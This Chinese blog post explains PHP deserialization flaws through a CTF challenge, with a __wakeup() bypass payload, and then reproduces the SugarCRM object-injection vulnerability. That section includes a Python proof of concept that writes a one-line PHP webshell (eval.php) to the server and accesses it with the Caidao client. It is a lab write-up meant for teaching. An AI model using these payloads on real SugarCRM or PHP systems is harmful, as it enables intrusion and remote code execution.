<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>从一道CTF题学习PHP反序列化漏洞 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="从一道CTF题学习PHP反序列化漏洞" />
<meta property="og:description" content="一、CTF题目 前阵子，参加了一个CTF比赛，其中有一条道题蛮有意思的，所以写出来分享一下。
此题利用了PHP的反序列化漏洞，通过构造特殊的Payload绕过__wakeup()魔术方法，从而实现注入目的，废话不多说，主要源码如下：
class SoFun{ protected $file=&#39;index.php&#39;; function __destruct(){ if(!empty($this-&gt;file)) { if(strchr($this-&gt; file,&#34;\\&#34;)===false &amp;&amp; strchr($this-&gt;file, &#39;/&#39;)===false) show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file); else die(&#39;Wrong filename.&#39;); }} function __wakeup(){ $this-&gt; file=&#39;index.php&#39;; } public function __toString(){return &#39;&#39; ;}} if (!isset($_GET[&#39;file&#39;])){ show_source(&#39;index.php&#39;); } else{ $file=base64_decode( $_GET[&#39;file&#39;]); echo unserialize($file ); } ?&gt; #&lt;!--key in flag.php--&gt; 1、代码审计 审计代码，可以发现要得到KEY，思路如下： 1、源码最后提示，KEY在flag.php里面； 2、注意到__destruct魔术方法中，有这么一段代码，将file文件内容显示出来 show_source(dirname(FILE).’/‘.$this-&gt;file)，这个是解题关键； 3、若POST“file”参数为序列化对象，且将file设为flag.php；那么可以通过unserialize反序列化，进而调用__destruct魔术方法来显示flag.php源码（要注意的是file参数内容需要经过base64编码）； 4、上面的分析是多么美好，但从代码分析可以知道，还有__wakeup这个拦路虎，通过unserialize反序列化之后，也会调用__wakeup方法，它会把file设为index.php； 5、总结下来就是，想办法把file设为flag.php，调用__destruct方法，且绕过__wakeup。
2、PHP反序列化对象注入漏洞 上网查资料，发现原来这个CTF题目是根据PHP反序列化对象注入漏洞改编的。
简单来说，当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行。举个栗子，比如有个Student类，里面有个参数为name。 实际情况：O:7:”Student”:1:{S:4:”name”;s:8:”zhangsan”;} Payload：O:7:”Student”:2:{S:4:”name”;s:8:”zhangsan”;}
Payload对象属性个数为2，而实际属性个数为1，那么就会掉入漏洞，从而跳过wakeup()方法。
3、CTF Payload 明确了这些之后，就可以构造出Payload了，需反序列化的对象为：
O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}
O:5:”SoFun” 指的是 类：5个字符：SoFun" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/0acb7b190fa54b8d08fca12310269881/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2018-09-17T14:44:57+08:00" />
<meta property="article:modified_time" content="2018-09-17T14:44:57+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">从一道CTF题学习PHP反序列化漏洞</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3>一、CTF题目</h3> 
<p>前阵子，参加了一个CTF比赛，其中有一条道题蛮有意思的，所以写出来分享一下。</p> 
<p>此题利用了PHP的反序列化漏洞，通过构造特殊的Payload绕过__wakeup()魔术方法，从而实现注入目的，废话不多说，主要源码如下：</p> 
<pre class="has"><code class="hljs">  class SoFun{ 
    protected $file='index.php';
    function __destruct(){ 
      if(!empty($this-&gt;file)) {
       if(strchr($this-&gt; file,"\\")===false &amp;&amp;  strchr($this-&gt;file, '/')===false)
          show_source(dirname (__FILE__).'/'.$this -&gt;file);
       else      die('Wrong filename.');
      }}  
    function __wakeup(){ $this-&gt; file='index.php'; } 
    public function __toString(){return '' ;}}     
    if (!isset($_GET['file'])){ show_source('index.php'); } 
    else{ 
       $file=base64_decode( $_GET['file']); 
       echo unserialize($file ); } 
?&gt;   #&lt;!--key in flag.php--&gt;</code></pre> 
<h4>1、代码审计</h4> 
<p>审计代码，可以发现要得到KEY，思路如下： <br> 1、源码最后提示，KEY在flag.php里面； <br> 2、注意到__destruct魔术方法中，有这么一段代码，将file文件内容显示出来 <br> show_source(dirname(FILE).’/‘.$this-&gt;file)，这个是解题关键； <br> 3、若POST“file”参数为序列化对象，且将file设为flag.php；那么可以通过unserialize反序列化，进而调用__destruct魔术方法来显示flag.php源码（要注意的是file参数内容需要经过base64编码）； <br> 4、上面的分析是多么美好，但从代码分析可以知道，还有__wakeup这个拦路虎，通过unserialize反序列化之后，也会调用__wakeup方法，它会把file设为index.php； <br> 5、总结下来就是，想办法把file设为flag.php，调用__destruct方法，且绕过__wakeup。</p> 
<h4>2、PHP反序列化对象注入漏洞</h4> 
<p>上网查资料，发现原来这个CTF题目是根据PHP反序列化对象注入漏洞改编的。</p> 
<p>简单来说，当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行<strong>。</strong>举个栗子，比如有个Student类，里面有个参数为name。 <br> 实际情况：O:7:”Student”:<strong>1</strong>:{S:4:”name”;s:8:”zhangsan”;} <br> Payload：O:7:”Student”:<strong>2</strong>:{S:4:”name”;s:8:”zhangsan”;}<br> Payload对象属性个数为2，而实际属性个数为1，那么就会掉入漏洞，从而跳过wakeup()方法。</p> 
<h4>3、CTF Payload</h4> 
<p>明确了这些之后，就可以构造出Payload了，需反序列化的对象为：</p> 
<p>O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}</p> 
<p>O:5:”SoFun” 指的是 类：5个字符：SoFun</p> 
<p>:2:  指的是 有两个对象</p> 
<p>S:7:”\00*\00file”   指的是有个属性，有7个字符，名为\00*\00file</p> 
<p>s:8:”flag.php”   指的是属性值，有8个字符，值为flag.php</p> 
<p><strong>值得注意的是，file是protected属性，因此需要用\00*\00来表示，\00代表ascii为0的值。另外，还需要经过Base64编码，结果为： </strong><br> Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</p> 
<p><img alt="" class="has" height="238" src="https://images2.imgbox.com/cc/e2/Zi86819A_o.png" width="1056"></p> 
<h3>二、反序列魔术方法调试</h3> 
<p>题目虽然搞定了，但对于反序列化的几个魔术方法感觉掌握还是不够，于是决定写段简单的代码辅助理解。</p> 
<h4>1、构造类</h4> 
<pre class="has"><code>    class Student{
    protected $name = 'Zhangsan';
    public $sex = 'man';
    function __wakeup(){
    echo ' __wake is working'; echo '&lt;/br&gt;';
    echo 'I am:'.$this-&gt;name = 'zhangsan'; echo '&lt;/br&gt;';}
    function __destruct(){
    echo '__destruct is working'; echo '&lt;/br&gt;';
    echo 'I am:'.$this-&gt;name; echo '&lt;/br&gt;';}}
</code></pre> 
<h4>2、将对象序列化为字符串</h4> 
<pre class="has"><code>$Zhangsan = new Student; 
$saveData = serialize($Zhangsan); //序列化后的字符串，可以保存在数据库或者文本文件中。
echo 'saveData is===&gt;'.$saveData; echo '&lt;/br&gt;';</code></pre> 
<p><img alt="" class="has" height="123" src="https://images2.imgbox.com/51/8e/pP3so35N_o.png" width="755"></p> 
<h4>3、正常反序列化情况</h4> 
<p>根据第一步得到的格式，构造Payload，可以发现__wakeup()方法正常运行，name仍然是zhangsan</p> 
<p><img alt="" class="has" height="201" src="https://images2.imgbox.com/c4/db/ch9F78uN_o.png" width="476"></p> 
<h4>4、异常反序列化情况</h4> 
<p>根据上面得到的格式，把属性个数改为3，构造Payload，可以发现已绕过__wakeup()方法<strong>，</strong>且__destruct方法将name置为我们想要的lisi。</p> 
<p><img alt="" class="has" height="377" src="https://images2.imgbox.com/8c/4e/8WjQWa0V_o.png" width="1107"></p> 
<h3>三、漏洞原理分析</h3> 
<p>从CTF题目和上面魔术方法调试的例子可以看出，造成漏洞主要有两个问题：应用代码问题、底层PHP漏洞。</p> 
<h4>（一）应用代码反序列化漏洞产生条件</h4> 
<p>1、反序列化函数，传入参数可控，如上面那道CTF题目$file就是可控的； <br> 2、__destruct()方法可利用，如CTF题目就是利用__destruct()方法中的show_source()，从而暴露源码； <br> 3、以上两点没有对传参进行过滤，否则无法构成目的Payload。</p> 
<h4>（二）底层PHP漏洞</h4> 
<p>简单来说，如果对象属性检查异常，那么Purrase_nested_data（）将会返回0，且<strong>不调用WAKEUP（）方法，但是在这之前对象和它的属性已经被创建，紧接着对象将被破坏，从而执行DESTRUCT（）函数</strong>，于是导致了漏洞。</p> 
<p><img alt="" class="has" height="358" src="https://images2.imgbox.com/c0/13/jfqDE9aD_o.png" width="932"></p> 
<h3>四、SugarCRM PHP反序列化对象注入漏洞</h3> 
<p>查资料的过程中，发现PHP反序列化漏洞原来在SugarCRM上已经被应用过。</p> 
<p>而SugarCRM是一款完全开放源代码的商业开源软件，拥有广泛的用户群体，可见此漏洞影响范围之大。</p> 
<p>下面进行漏洞还原，顺便学习下了解底层漏洞之后，如何审计应用代码。</p> 
<h4>（一）环境搭建</h4> 
<p>根据报告，此漏洞影响的版本为： <br> SugarCRM &lt;= 6.5.23 PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 <br> 于是从sourceforge上下载SugarCRM 6.5.23，一顿安装之后，搭载在Wamp上即可使用。 <br><a href="https://sourceforge.net/projects/sugarcrm/files/OldFiles/1%20-%20SugarCRM%206.5.X/SugarCommunityEdition-6.5.X/" rel="nofollow">下载链接：https://sourceforge.net/projects/sugarcrm/files/OldFiles/1%20-%20SugarCRM%206.5.X/SugarCommunityEdition-6.5.X/</a> <br> 而我的环境是：SugarCRM = 6.5.23； PHP = 5.3.10</p> 
<p><img alt="" class="has" height="664" src="https://images2.imgbox.com/6c/2e/sBoiiZvQ_o.png" width="1200"></p> 
<h4>（二）代码审计</h4> 
<p>为了方便审计代码，推荐用PhpStorm作为IDE，方便查阅。</p> 
<p><strong>明确三个条件</strong></p> 
<p>按照上面介绍，构成漏洞需满足三个条件： <br> 1、反序列化函数，传入参数可控； <br> 2、__destruct()方法可利用； <br> 3、以上两点没有对传参进行过滤。</p> 
<p>按照这三个条件，开始在SugarCRM上寻找目标。</p> 
<p><strong>寻找传入参数可控的反序列化函数</strong></p> 
<p>通过PhpStrom的查找功能，找到了这样的一个函数</p> 
<p>$data = sugar_unserialize(from_html($data));</p> 
<p><img alt="" class="has" height="648" src="https://images2.imgbox.com/e8/fe/NScjzhCl_o.png" width="837"></p> 
<p>继续查看sugar_unserialize(）函数定义，发现正则表达式虽然进行了过滤，但很容易被绕过</p> 
<p><img alt="" class="has" height="195" src="https://images2.imgbox.com/41/77/qr0laLN2_o.png" width="476"></p> 
<p>比如把o:32:改成o:+32:，就可以完成绕过（/i是忽略大小写的意思，在下图软件中通过打勾实现），从而把$value传入到unserialize()方法中实现反序列化。</p> 
<p><img alt="" class="has" height="494" src="https://images2.imgbox.com/ff/11/8CwS1XBX_o.png" width="598"></p> 
<p><strong>可控的传入参数找到了，接下来就是找可利用的destruct()、wakeup()</strong></p> 
<p><img alt="" class="has" height="708" src="https://images2.imgbox.com/05/0a/3fQ5KkLs_o.png" width="1200"></p> 
<p>通过PhpStrom的查找功能，发现在\include\SugarCache\SugarCacheFile.php有我们刚才接触到的两个魔术方法__destruct()、__wakeup()，并且有如下发现： <br> 1、wakeup()方法会清除对象属性，不过好在我们可以绕过；<br> 2、destruct()方法似乎还能通过sugar_file_put_contents()上传文件，但前提是$this-&gt;_cacheChanged=true；</p> 
<p>3、继续看sugar_file_put_contents()这个方法，可以通过$this-&gt;_cacheFileName、$this-&gt;_localStore 实现文件上传。其中：</p> 
<p>$filename = sugar_cached($this-&gt;_cacheFileName);</p> 
<p>$data = serialize($this-&gt;_localStore);</p> 
<p><img alt="" class="has" height="373" src="https://images2.imgbox.com/42/d3/pF37vm0x_o.png" width="549"></p> 
<p>4、$_cacheFileName、$_cacheChanged都是protected属性参数，所以构造Payload时，需要在参数名前加\00*\00</p> 
<p><img alt="" class="has" height="320" src="https://images2.imgbox.com/1b/e5/CKyYNatF_o.png" width="622"></p> 
<p> 5、以上两个条件均没有形成有效的过滤限制，所以构造Payload应该是可行的</p> 
<h4>（三）Python payload构造与菜刀连接</h4> 
<p>参考了大表哥<strong>p0wd3r的代码，POC代码如下：</strong></p> 
<pre class="has"><code class="hljs">import requests as req    
url = ‘http://127.0.0.1/SugarCE-Full-6.5.23/service/v4/rest.php‘    
data = {    
 ‘method’: ‘login’,    
 ‘input_type’: ‘Serialize’,    
 ‘rest_data’: 
‘O:+14:”SugarCacheFile”:23:{S:17:”\00\00_cacheFileName”;s:18:”../custom/eval.php”;S:16:”\00\00_cacheChanged”;b:1;S:14:”\00*\00_localStore”;a:1:{i:0;s:29:”&lt;?php
 eval($_POST[\’CTF\’]); ?&gt;”;}}’,    
}    
req.post(url, data=data)</code></pre> 
<p>在/custom/目录下生成了一句话木马文件 eval.php，接着就可以上菜刀了。</p> 
<p><img alt="" class="has" height="239" src="https://images2.imgbox.com/54/3f/zvwtuek0_o.png" width="447"></p> 
<p><img alt="" class="has" height="479" src="https://images2.imgbox.com/44/e4/sHWMjwf2_o.png" width="898"></p> 
<p>文中提到的CTF题目、魔术方法调试、SugarCRM源码链接:</p> 
<p>链接：<a href="https://pan.baidu.com/s/1GLLuixPkMFlosOWe4KC6ZA" rel="nofollow">https://pan.baidu.com/s/1GLLuixPkMFlosOWe4KC6ZA</a> 密码：2265</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/66104e4daec5902a2fd1e5c9aad0e3ec/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">argparse命令行解析模块</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ae67c5d873f9e726ce3937bd2a6f6cb6/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">ImportError: No module named pkg_resources解决方案  CentOS6.5上安装Python2.7和PIP</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>